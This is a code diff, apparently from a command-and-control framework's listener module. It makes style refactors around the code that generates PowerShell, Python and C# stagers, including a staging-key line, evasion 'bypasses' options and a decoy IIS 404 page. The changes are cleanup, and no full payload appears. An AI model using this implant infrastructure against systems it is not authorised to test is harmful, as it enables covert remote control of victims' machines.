@@ -185,7 +185,8 @@ class Listener:
         """
         Returns an IIS 7.5 404 not found page.
         """
-        return open(f"{self.template_dir }/default.html").read()
+        with open(f"{self.template_dir}/default.html") as f:
+            return f.read()
 
     def validate_options(self) -> tuple[bool, str | None]:
         """
@@ -220,7 +221,7 @@ class Listener:
         language=None,
         safe_checks="",
         listener_name=None,
-        bypasses: list[str] = None,
+        bypasses: list[str] | None = None,
     ):
         """
         Generate a basic launcher for the specified listener.
@@ -313,12 +314,11 @@ class Listener:
             listenerOptions = copy.deepcopy(listenerOptions)
             bindIP = listenerOptions["BindIP"]["Value"]
             port = listenerOptions["Port"]["Value"]
-            if ":" in bindIP:
-                if "http" in host:
-                    if "https" in host:
-                        host = "https://" + "[" + str(bindIP) + "]" + ":" + str(port)
-                    else:
-                        host = "http://" + "[" + str(bindIP) + "]" + ":" + str(port)
+            if ":" in bindIP and "http" in host:
+                if "https" in host:
+                    host = "https://" + "[" + str(bindIP) + "]" + ":" + str(port)
+                else:
+                    host = "http://" + "[" + str(bindIP) + "]" + ":" + str(port)
 
             # code to turn the key string into a byte array
             stager += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{ staging_key }');"
@@ -394,7 +394,7 @@ class Listener:
                 if safe_checks.lower() == "true":
                     launcherBase += listener_util.python_safe_checks()
             except Exception as e:
-                p = f"{listener_name}: Error setting LittleSnitch in stager: {str(e)}"
+                p = f"{listener_name}: Error setting LittleSnitch in stager: {e!s}"
                 log.error(p)
 
             if user_agent.lower() == "default":
@@ -510,7 +510,7 @@ class Listener:
             )
 
             compiler = self.mainMenu.pluginsv2.get_by_id("csharpserver")
-            if not compiler.status == "ON":
+            if compiler.status != "ON":
                 self.instance_log.error(
                     f"{listener_name} csharpserver plugin not running"
                 )
@@ -712,11 +712,11 @@ class Listener:
 
         elif language == "python":
             if version == "ironpython":
-                f = open(self.mainMenu.installPath + "/data/agent/ironpython_agent.py")
+                f = self.mainMenu.installPath + "/data/agent/ironpython_agent.py"
             else:
-                f = open(self.mainMenu.installPath + "/data/agent/agent.py")
-            code = f.read()
-            f.close()
+                f = self.mainMenu.installPath + "/data/agent/agent.py"
+            with open(f) as f:
+                code = f.read()
 
             # strip out comments and blank lines
             code = helpers.strip_python_comments(code)
@@ -847,7 +847,7 @@ class Listener:
                 obfuscation = obfuscation_config.enabled
                 obfuscation_command = obfuscation_config.command
 
-            if "powershell" == stager:
+            if stager == "powershell":
                 launcher = self.mainMenu.stagergenv2.generate_launcher(
                     listener_name=hop or listenerName,
                     language="powershell",
@@ -860,7 +860,7 @@ class Listener:
                 )
                 return launcher
 
-            elif "python" == stager:
+            elif stager == "python":
                 launcher = self.mainMenu.stagergenv2.generate_launcher(
                     listener_name=hop or listenerName,
                     language="python",
@@ -873,7 +873,7 @@ class Listener:
                 )
                 return launcher
 
-            elif "ironpython" == stager:
+            elif stager == "ironpython":
                 if hop:
                     options = copy.deepcopy(self.options)
                     options["Listener"] = {}
@@ -899,7 +899,7 @@ class Listener:
                     code = f.read()
                 return code
 
-            elif "csharp" == stager:
+            elif stager == "csharp":
                 filename = self.mainMenu.stagergenv2.generate_launcher(
                     listener_name=hop or listenerName,
                     language="csharp",
@@ -1224,9 +1224,9 @@ class Listener:
 
                 # support any version of tls
                 pyversion = sys.version_info
-                if pyversion[0] == 2 and pyversion[1] == 7 and pyversion[2] >= 13:
-                    proto = ssl.PROTOCOL_TLS
-                elif pyversion[0] >= 3:
+                if (pyversion[0] == 2 and pyversion[1] == 7 and pyversion[2] >= 13) or (
+                    pyversion[0] >= 3
+                ):
                     proto = ssl.PROTOCOL_TLS
                 else:
                     proto = ssl.PROTOCOL_SSLv23
